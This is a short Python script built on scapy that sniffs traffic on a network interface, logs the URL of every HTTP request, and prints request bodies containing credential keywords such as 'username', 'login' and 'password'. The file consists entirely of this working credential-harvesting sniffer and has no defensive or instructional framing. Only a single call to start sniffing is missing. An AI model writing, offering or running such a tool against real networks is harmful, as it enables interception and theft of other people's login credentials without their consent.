import scapy.all as scapy
from scapy.layers import http

keywords = {'username', 'user', 'uname', 'login', 'password', 'pass', 'signin', 'signup', 'name'}

def sniff(interface):
    # Doing sniff for every packet
    scapy.sniff(iface= interface, store = False, prn=handle_packet)

def handle_packet(packet):
    # The func check if the packet is http request and print the url and check if has credential info
    if packet.haslayer(http.HTTPRequest):
        url = get_url(packet)
        print("HTTP URL is : {}".format(url))
        cred = get_credentials(packet)
        if cred:
            print("Print possible credential information : {}".format(cred))
    # print("new packet")

def get_url(packet):
    # The func get the url of packet
    return (packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path).decode('utf-8')

def get_credentials(packet):
    # The func return data that can be credential info
    if packet.haslayer(scapy.Raw):
        field_load = packet[scapy.Raw].load.decode('utf-8')
        for keyword in keywords:
            if keyword in field_load:
                return field_load